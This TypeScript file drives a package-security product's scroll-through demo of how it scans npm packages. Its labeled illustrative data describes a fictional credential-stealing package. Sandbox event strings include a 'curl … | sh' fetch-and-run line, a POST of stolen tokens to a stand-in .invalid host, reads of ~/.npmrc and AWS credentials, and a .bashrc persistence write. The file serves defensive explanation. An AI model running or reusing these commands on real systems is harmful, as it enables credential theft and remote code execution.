// Single source of truth for the home-page "how we test a package" journey.
// When false, every sandbox visual carries an "In development" badge.
export const SANDBOX_LIVE = true;

export type StageId = "fetch" | "intel" | "info" | "fork" | "ai" | "verdict";

export type Stage = {
  id: StageId;
  /** How many "screens" of scrolling this stage gets. */
  weight: number;
  title: string;
};

export const STAGES: Stage[] = [
  { id: "fetch", weight: 1, title: "Fetch & verify" },
  { id: "intel", weight: 1, title: "Threat intel" },
  { id: "info", weight: 1, title: "Package info" },
  { id: "fork", weight: 3.6, title: "Read it and run it" },
  { id: "ai", weight: 1.5, title: "AI review" },
  { id: "verdict", weight: 1.3, title: "Verdict" },
];

/** The seven numbered steps shown in the progress rail. Steps 4 and 5 run in parallel. */
export const RAIL: { n: number; label: string; stage: StageId; lane?: "static" | "sandbox" }[] = [
  { n: 1, label: "Fetch", stage: "fetch" },
  { n: 2, label: "Intel", stage: "intel" },
  { n: 3, label: "Info", stage: "info" },
  { n: 4, label: "Read it", stage: "fork", lane: "static" },
  { n: 5, label: "Run it", stage: "fork", lane: "sandbox" },
  { n: 6, label: "AI", stage: "ai" },
  { n: 7, label: "Verdict", stage: "verdict" },
];

export const clamp01 = (n: number) => Math.min(1, Math.max(0, n));

const TOTAL_WEIGHT = STAGES.reduce((sum, s) => sum + s.weight, 0);

/** Scroll progress (0..1) to the active stage and how far through it we are (0..1). */
export function locate(progress: number): { index: number; t: number } {
  const x = clamp01(progress) * TOTAL_WEIGHT;
  let acc = 0;
  for (let i = 0; i < STAGES.length; i++) {
    const w = STAGES[i].weight;
    if (x <= acc + w || i === STAGES.length - 1) {
      return { index: i, t: clamp01((x - acc) / w) };
    }
    acc += w;
  }
  return { index: STAGES.length - 1, t: 1 };
}

/** Scroll progress at which a stage begins, so the rail can jump to it. */
export function stageStart(index: number): number {
  let acc = 0;
  for (let i = 0; i < index; i++) acc += STAGES[i].weight;
  return acc / TOTAL_WEIGHT;
}

export const journeyHeightVh = Math.round(TOTAL_WEIGHT * 130);

/** Progress 0..1 of `t` between `from` and `to`. */
export function between(t: number, from: number, to: number): number {
  return clamp01((t - from) / (to - from));
}

/** The first part of `text`, typed out as `t` moves from `from` to `to`. */
export function typed(text: string, t: number, from: number, to: number): string {
  return text.slice(0, Math.floor(text.length * between(t, from, to)));
}

// ---------------------------------------------------------------------------
// Illustrative demo data. Not a real scan. Every visual that uses it is labeled
// "Illustrative example".
// ---------------------------------------------------------------------------

export const DEMO = {
  name: "nodelogger-pro",
  version: "1.0.3",
  tarball: "nodelogger-pro-1.0.3.tgz",
  sizeKb: 14,
  files: 9,
  integrity: "sha512-7Xk2Qp9dLm4tRb0vHn3eYw1aZs8cUj6O",
};

export type Flag = { label: string; detail: string; warn: boolean; at: number };

export const INFO_FLAGS: Flag[] = [
  { label: "Install script", detail: "runs postinstall.js", warn: true, at: 0.08 },
  { label: "Published", detail: "6 hours ago", warn: true, at: 0.2 },
  { label: "Publisher", detail: "first-ever package", warn: true, at: 0.32 },
  { label: "Repository", detail: "none linked", warn: true, at: 0.44 },
  { label: "Trusted publishing", detail: "not used", warn: true, at: 0.56 },
  { label: "Name lookalike", detail: "no close match", warn: false, at: 0.66 },
  { label: "Version jump", detail: "normal (1.0.3)", warn: false, at: 0.76 },
  { label: "Tarball vs registry", detail: "manifests match", warn: false, at: 0.86 },
];

export type StaticFinding = { rule: string; text: string; sev: "LOW" | "MEDIUM" | "HIGH"; at: number };

export const STATIC_FILES = [
  "package.json",
  "index.js",
  "scripts/postinstall.js",
  "lib/format.js",
  "lib/_0x4f2a.js",
];

export const STATIC_FINDINGS: StaticFinding[] = [
  { rule: "metadata.install_script", text: "postinstall.js runs at install time", sev: "MEDIUM", at: 0.14 },
  { rule: "code.env_dump", text: "postinstall.js reads every environment variable", sev: "MEDIUM", at: 0.3 },
  { rule: "code.install_network", text: "postinstall.js makes a network call", sev: "MEDIUM", at: 0.42 },
  { rule: "code.decode_and_run", text: "_0x4f2a.js decodes a base64 blob, then eval()s it", sev: "HIGH", at: 0.56 },
];

export type SbTag = "decoy" | "canary" | "persist" | "cond" | "net";
export type SbEvent = {
  at: number;
  run: "A" | "B";
  kind: "install" | "proc" | "file" | "dns" | "http" | "eval" | "cond";
  text: string;
  tag?: SbTag;
};

export const SB_EVENTS: SbEvent[] = [
  { at: 0.06, run: "A", kind: "install", text: "npm install ./nodelogger-pro-1.0.3.tgz  (scripts on)" },
  { at: 0.1, run: "A", kind: "proc", text: "node scripts/postinstall.js" },
  { at: 0.15, run: "A", kind: "file", text: "read  ~/.npmrc", tag: "decoy" },
  { at: 0.19, run: "A", kind: "file", text: "read  ~/.aws/credentials", tag: "decoy" },
  { at: 0.23, run: "A", kind: "eval", text: "eval(<decoded 412 B payload>)  saved to trace" },
  { at: 0.28, run: "A", kind: "dns", text: "resolve  telemetry-cdn.invalid  →  sinkhole", tag: "net" },
  { at: 0.34, run: "A", kind: "http", text: "POST  telemetry-cdn.invalid/collect  (1.1 KB)", tag: "net" },
  { at: 0.38, run: "A", kind: "http", text: "body contains canary_npm_7f3a91…", tag: "canary" },
  { at: 0.44, run: "A", kind: "proc", text: "sh -c \"curl -s telemetry-cdn.invalid/i | sh\"" },
  { at: 0.5, run: "A", kind: "file", text: "write  ~/.bashrc  (+1 line)", tag: "persist" },
  { at: 0.6, run: "B", kind: "install", text: "same install, but CI=true, clock +60 days" },
  { at: 0.66, run: "B", kind: "dns", text: "resolve  deploy-hook.invalid  →  sinkhole", tag: "cond" },
  { at: 0.72, run: "B", kind: "cond", text: "only in run B: 2nd host contacted", tag: "cond" },
];

export type Decoy = { path: string; hitAt: number; canary?: boolean };

export const DECOYS: Decoy[] = [
  { path: "~/.npmrc", hitAt: 0.15, canary: true },
  { path: "~/.aws/credentials", hitAt: 0.19, canary: true },
  { path: "~/.ssh/id_rsa", hitAt: 2 },
  { path: "~/.docker/config.json", hitAt: 2 },
  { path: "browser Login Data", hitAt: 2 },
  { path: "crypto wallets", hitAt: 2 },
];

export const SB_FINDINGS: { rule: string; sev: "MEDIUM" | "HIGH"; proof?: boolean; at: number }[] = [
  { rule: "sandbox.decoy_read", sev: "MEDIUM", at: 0.2 },
  { rule: "sandbox.canary_exfil", sev: "HIGH", proof: true, at: 0.4 },
  { rule: "sandbox.persistence", sev: "HIGH", proof: true, at: 0.52 },
  { rule: "sandbox.conditional_behavior", sev: "HIGH", proof: true, at: 0.75 },
];

export const WATCH_CHIPS = [
  "DNS lookups",
  "Connections",
  "HTTP requests",
  "Processes",
  "Files read / written",
  "Decoy credentials",
  "Decoded eval code",
  "Dropped + run files",
  "CPU abuse",
];

export const AI_TEXT =
  "The static scan flagged an install script that reads the environment, calls out to the network and evals a decoded blob. That alone could be a telemetry helper. The sandbox settles it: our planted npm token appeared inside the POST body to telemetry-cdn.invalid, and a second host was only contacted when CI=true. That is credential theft that hides from local analysis.";

export const DECIDED_BY = [
  { id: "intel", label: "Threat intel", note: "final, cannot be overridden" },
  { id: "sandbox", label: "Sandbox proof", note: "final, cannot be overridden" },
  { id: "ai", label: "AI review", note: "judgment, with confidence" },
  { id: "rules", label: "Rules", note: "fallback if AI is unavailable" },
] as const;
